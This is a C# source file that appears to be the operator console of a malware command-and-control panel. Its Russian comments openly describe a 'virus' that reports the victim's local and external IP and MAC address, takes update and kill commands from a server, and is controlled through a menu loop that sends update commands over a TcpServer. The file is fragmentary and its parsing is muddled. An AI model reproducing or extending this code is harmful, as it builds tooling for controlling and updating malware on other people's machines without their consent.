using System;

namespace MainControllPannel
{
    /*
    Комманды:
        C0. Комманд нету
        C1. убить процесс себя
 */
    /*
     Ошибки:
    1.1 Запустить программу с обновлением
    1.2 Не получилось из сообщения достать размер файла
    1.3 Не получилось убить процесс себя
     */
    /*
     Комманды от сервака:
    U. Обнова и далее размер файла
    C. Комманда, далее код комманды
     */

    /*
     Комманды от себя:
    V. версия вируса
    I. локальный IP
    O. внешний IP
    M. Мак адрес
     */
    class ConsoleTask
    {
        public void ConsoleStart()
        {
            while (true)
            {
                string temp = "";
                Console.WriteLine("Список комманд:\nU[Полный путь до размещения exe файла] - обновляет вирус\nC1 - выключает вирус");
                temp = Console.ReadLine();
                switch (temp[0])
                {
                    case 'U':
                        string mac_temp = "";
                        for (int i = 2; i < temp.Length; i++)
                        {
                            mac_temp += temp[i];
                        }
                        TcpServer tcp = new TcpServer();
                        tcp.SetCommand(mac_temp, "U");
                        break;
                    default:
                        break;
                }
            }
        }
    }
}
